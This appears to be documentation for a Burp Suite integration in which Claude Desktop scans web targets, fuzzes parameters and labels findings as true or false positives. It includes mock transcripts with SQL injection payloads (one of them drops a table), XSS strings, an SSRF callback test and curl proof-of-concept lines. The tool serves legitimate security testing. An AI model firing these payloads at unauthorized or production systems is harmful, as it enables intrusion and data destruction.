# AI-Driven Security Validation Workflow

> **How Claude Desktop Becomes Your Security Analyst**

This document explains the AI-powered validation workflow where you simply talk to Claude Desktop, and it automatically:
1. Scans your target
2. Analyzes each finding with AI
3. Validates with Repeater + Intruder-like fuzzing
4. Uses Collaborator for OOB testing (when available)
5. Provides a final verdict: TRUE POSITIVE or FALSE POSITIVE

**No terminal commands. No manual testing. Just conversation.**

---

## The Complete AI Workflow

### You Say (One Command):
```
Thoroughly scan and validate https://example.com - give me only true positives
```

### Claude Does Automatically:

```
Step 1: Start scan
Step 2: Wait for completion (with progress updates)
Step 3: Retrieve all findings
Step 4: For EACH finding:
   a. AI analyzes the vulnerability type
   b. Creates custom validation plan
   c. Tests with Repeater
   d. Fuzzes with multiple payloads (Intruder-style)
   e. Tests for OOB interactions (Collaborator-style)
   f. Determines: TRUE POSITIVE or FALSE POSITIVE
Step 5: Generate report with:
   - Only confirmed vulnerabilities
   - Proof-of-concept for each
   - Exploit ability assessment
   - Remediation guidance
```

**Result:** You get a clean list of ONLY real vulnerabilities with proof.

---

## New MCP Tools (16 Total)

### Core Tools (11 - Already Working)
1. `burp_start_scan` - Start scans
2. `burp_get_scan_status` - Monitor progress
3. `burp_get_scan_issues` - Get findings
4. `burp_wait_for_scan` - Wait for completion
5. `burp_stop_scan` - Cancel scans
6. `burp_send_to_repeater` - Manual HTTP testing
7. `burp_get_proxy_history` - Traffic analysis
8. `burp_set_scope` - Configure scope
9. `burp_validate_sqli` - Basic SQLi testing
10. `burp_validate_xss` - Basic XSS testing
11. `burp_health_check` - Connection check

### New AI-Powered Tools (5 - Just Added)
12. **`burp_ai_validate_finding`** - AI-driven validation with custom plans
13. **`burp_fuzz_parameter`** - Intruder-like payload fuzzing
14. **`burp_collaborator_generate`** - Generate OOB test domains
15. **`burp_collaborator_poll`** - Check for OOB callbacks
16. **`burp_comprehensive_scan_and_validate`** - Full automated workflow

---

## How It Works: AI-Driven Validation

### Example 1: Complete Automated Testing

**You:**
```
Scan and validate https://api.example.com - exclude /health and /metrics
```

**Claude's Automated Workflow:**

```python
# Step 1: Configure & Scan
→ burp_set_scope(include=["/api/*"], exclude=["/health", "/metrics"])
→ burp_start_scan(urls=["https://api.example.com"])
→ burp_wait_for_scan(scan_id=7, poll_interval=10)

# Step 2: Get Findings
→ burp_get_scan_issues(scan_id=7)
  Found 8 issues:
  - 2 HIGH (SQL injection, XSS)
  - 4 MEDIUM (various)
  - 2 LOW (info disclosure)

# Step 3: AI Validation (Automatic for each HIGH)
For issue #1: SQL Injection at /api/users?id=1

→ burp_ai_validate_finding(scan_id=7, issue_index=0)
  Returns validation plan:
  - Step 1: Time-based SQLi test
  - Step 2: Boolean-based SQLi test
  - Step 3: Error-based SQLi test

→ burp_fuzz_parameter(
    url="/api/users",
    parameter="id",
    payloads=["' OR SLEEP(5)--", "' AND SLEEP(5)--", "' AND '1'='1", "' AND '1'='2"]
  )

  Results analyzed:
  - Payload 1: Response time 5.2s → TIME-BASED CONFIRMED ✓
  - Payload 2: Response time 5.1s → TIME-BASED CONFIRMED ✓
  - Payload 3: 200 OK, 10 rows
  - Payload 4: 200 OK, 0 rows → BOOLEAN-BASED CONFIRMED ✓

  VERDICT: TRUE POSITIVE - Blind SQL Injection
  Confidence: HIGH
  Evidence: 3/4 tests confirmed

For issue #2: XSS at /api/search?q=test

→ burp_ai_validate_finding(scan_id=7, issue_index=1)
  Returns validation plan:
  - Step 1: Basic reflection test
  - Step 2: Encoding bypass test
  - Step 3: CSP check

→ burp_send_to_repeater(
    url="/api/search",
    request="GET /api/search?q=<script>alert(1)</script>"
  )

  Response analysis:
  - Status: 200 OK
  - Payload reflected: Yes
  - But encoded: &lt;script&gt;alert(1)&lt;/script&gt;
  - CSP: script-src 'self'

→ burp_fuzz_parameter(
    url="/api/search",
    parameter="q",
    payloads=["<svg onload=alert(1)>", "<img src=x onerror=alert(1)>", ...]
  )

  Results: All payloads HTML-encoded

  VERDICT: FALSE POSITIVE - Proper encoding + CSP
  Confidence: HIGH
  Recommendation: No action needed
```

**Claude Reports:**
```
Security Assessment Complete

Scan Target: https://api.example.com
Total Findings: 8
Validated: 2 HIGH severity

CONFIRMED VULNERABILITIES (1):

[HIGH] SQL Injection - /api/users
├─ Parameter: id
├─ Type: Time-based blind SQLi
├─ Tests Performed: 4
├─ Tests Confirmed: 3/4
├─ Confidence: HIGH
├─ Impact: Complete database compromise
└─ Proof-of-Concept:
   curl 'https://api.example.com/api/users?id=1%27%20OR%20SLEEP(5)--'
   Response time: 5.2 seconds (expected: <1s)

FALSE POSITIVES (1):

[HIGH] XSS - /api/search (FALSE POSITIVE)
├─ Reason: All payloads properly encoded
├─ Protection: HTML encoding + CSP: script-src 'self'
└─ Recommendation: No action needed

Recommendations:
1. Immediate remediation required for SQL injection
2. Use prepared statements or parameterized queries
3. Implement input validation on 'id' parameter
```

---

### Example 2: Targeted Validation

**You:**
```
I found a potential SQL injection in scan 7, issue index 3
Validate it thoroughly and show me proof
```

**Claude:**
```
→ burp_ai_validate_finding(scan_id=7, issue_index=3)

Analyzing: SQL Injection at /products?cat=electronics

Validation Plan:
1. Time-based blind SQLi
2. Boolean-based SQLi
3. Error-based SQLi
4. UNION-based SQLi

→ burp_fuzz_parameter(
    url="/products",
    parameter="cat",
    payloads=[
      "' OR SLEEP(5)--",
      "' AND SLEEP(5)--",
      "' AND '1'='1",
      "' AND '1'='2",
      "' OR 1=1--",
      "' UNION SELECT NULL--"
    ]
  )

Results:
✓ Time-based: Confirmed (5.3s delay)
✓ Boolean-based: Confirmed (different responses)
✗ Error-based: No SQL errors
✗ UNION-based: Syntax error

VERDICT: TRUE POSITIVE
Confidence: HIGH (2/4 test types confirmed)
Type: Blind SQL Injection

Proof-of-Concept:
curl 'https://example.com/products?cat=electronics%27%20OR%20SLEEP(5)--'

Expected: <1s response
Actual: 5.3s response

This is exploitable. Recommend using sqlmap for full exploitation.
```

---

### Example 3: Intruder-Style Fuzzing

**You:**
```
Fuzz the username parameter at /login with these payloads:
- admin' OR '1'='1
- admin' --
- ' UNION SELECT NULL--
- admin'); DROP TABLE users--
```

**Claude:**
```
→ burp_fuzz_parameter(
    url="https://example.com/login",
    parameter="username",
    payloads=[
      "admin' OR '1'='1",
      "admin' --",
      "' UNION SELECT NULL--",
      "admin'); DROP TABLE users--"
    ]
  )

Fuzzing Results:

Payload #1: admin' OR '1'='1
├─ Status: 302 Redirect
├─ Time: 234ms
├─ Length: 0 bytes
└─ Analysis: Successful authentication bypass!

Payload #2: admin' --
├─ Status: 302 Redirect
├─ Time: 189ms
├─ Length: 0 bytes
└─ Analysis: Also bypassed authentication

Payload #3: ' UNION SELECT NULL--
├─ Status: 500 Internal Server Error
├─ Time: 45ms
├─ Response: "SQL syntax error near 'UNION'"
└─ Analysis: SQL error leaked!

Payload #4: admin'); DROP TABLE users--
├─ Status: 200 OK
├─ Time: 12ms
├─ Length: 1248 bytes
└─ Analysis: Invalid username (payload blocked or failed)

Summary:
- Time outliers: 2 (payloads #1, #2 took 2x longer)
- Unique status codes: [200, 302, 500]
- Potential anomalies: Payloads #1 and #2 (redirects indicate success)

VERDICT: SQL Injection CONFIRMED
- Authentication bypass possible
- SQL errors being leaked
- Two payloads successfully exploited

Recommendation: CRITICAL - Immediate remediation required
```

---

### Example 4: Collaborator OOB Testing

**You:**
```
Test that SSRF finding at /fetch?url= with Collaborator
```

**Claude:**
```
→ burp_collaborator_generate(tag="ssrf-test")

Note: Burp REST API v0.1 doesn't support Collaborator
Workaround: Manually generate subdomain in Burp UI

Using manual subdomain: xyz123.burpcollaborator.net

→ burp_send_to_repeater(
    url="/fetch",
    request="GET /fetch?url=http://xyz123.burpcollaborator.net HTTP/1.1"
  )

Response: 200 OK (fetched successfully)

→ burp_collaborator_poll(collaborator_id="xyz123")

Manual Check Required:
1. Open Burp Suite → Burp menu → Burp Collaborator client
2. Click "Poll now"
3. Check for interactions from target IP

If you see DNS/HTTP requests:
→ SSRF CONFIRMED ✓

If no interactions:
→ Possible false positive or internal SSRF only
```

---

## Workflow Comparison

### Old Way (Manual):
```
1. burp-cli scan https://example.com --wait
2. burp-cli issues <scan-id>
3. Read JSON output (30 findings)
4. For each finding:
   a. Open Burp Repeater
   b. Manually craft payloads
   c. Send requests
   d. Analyze responses
   e. Determine true vs false positive
   f. Document evidence
5. Hours of work for 30 findings
```

### New Way (AI-Driven):
```
You: "Thoroughly scan and validate example.com"

Claude: *Does all 30 validations automatically*
        *Returns only 3 confirmed true positives*
        *With proof-of-concept for each*

Result: 5 minutes instead of 5 hours
```

---

## Use Cases

### 1. Bug Bounty Hunting
```
You: Scan all endpoints at api.example.com and validate only CRITICAL findings
Claude: *Scans → Validates → Returns only exploitable vulns with PoCs*
```

### 2. Penetration Testing
```
You: Comprehensive scan of internal app at 192.168.1.100
     Validate everything and generate a client report
Claude: *Full workflow → Validated findings → Professional report*
```

### 3. Continuous Security
```
You: Scan staging.example.com daily and alert me to new findings
Claude: *Scheduled scans → Baseline comparison → Alerts on changes*
```

### 4. Responsible Disclosure
```
You: Validate that SQLi at /api/users?id=1 without being destructive
Claude: *Time-based + Boolean tests only → Proof without exploitation*
```

---

## Technical Details

### How AI Validation Works

1. **Context Analysis:**
   - Issue type (SQLi, XSS, SSRF, etc.)
   - Severity and confidence
   - Affected parameter and URL
   - Request/response evidence

2. **Plan Creation:**
   - Claude generates custom test plan
   - Selects appropriate payloads
   - Chooses validation methods
   - Defines success criteria

3. **Execution:**
   - Uses `burp_send_to_repeater` for single tests
   - Uses `burp_fuzz_parameter` for multiple payloads
   - Uses `burp_collaborator_*` for OOB testing

4. **Analysis:**
   - Compares response times
   - Checks for error messages
   - Analyzes response differences
   - Detects anomalies

5. **Verdict:**
   - TRUE POSITIVE: Confirmed exploitable
   - LIKELY TRUE POSITIVE: Probable but needs review
   - LIKELY FALSE POSITIVE: Probably not exploitable
   - FALSE POSITIVE: Definitely not exploitable

### Fuzzing Analysis

The `burp_fuzz_parameter` tool automatically analyzes:
- **Time outliers:** Payloads causing delays (SQLi, command injection)
- **Status code changes:** Different behavior per payload
- **Response length variations:** Content differences
- **Error patterns:** SQL/system errors leaked

---

## Best Practices

### 1. Start Simple
```
You: Is Burp connected?
Claude: ✓ Connected to Burp Suite Professional v2025.10.4

You: Scan testphp.vulnweb.com
Claude: *Scans and reports findings*
```

### 2. Be Specific About Validation
```
Good: "Validate all HIGH severity SQLi findings with time-based tests"
Bad: "Check the scan"
```

### 3. Request Proof
```
You: Show me proof-of-concept for each confirmed vulnerability
Claude: *Generates working PoCs with curl commands*
```

### 4. Iterate Based on Results
```
You: That XSS was a false positive. What about the SSRF?
Claude: *Validates SSRF with OOB testing*
```

---

## Limitations

### Burp API v0.1 Constraints
- ❌ No native Collaborator API (manual workaround needed)
- ❌ No Intruder API (using repeater + fuzzing instead)
- ❌ No active scanner configuration API
- ❌ Limited extension API

### Workarounds Implemented
- ✅ `burp_fuzz_parameter` → Intruder-like functionality via Repeater
- ✅ `burp_ai_validate_finding` → AI-driven test plan execution
- ⚠️ Collaborator → Manual polling in Burp UI required

---

## Next Steps

1. **Try the comprehensive workflow:**
   ```
   Thoroughly scan and validate https://testphp.vulnweb.com
   ```

2. **Test AI validation:**
   ```
   For scan 7, validate all HIGH severity findings
   ```

3. **Use fuzzing:**
   ```
   Fuzz the id parameter at /products with SQL injection payloads
   ```

4. **Get final report:**
   ```
   Generate a security report with only confirmed true positives
   ```

**Remember:** You're having a conversation. Claude handles all the technical complexity - you just describe what security testing you want done.
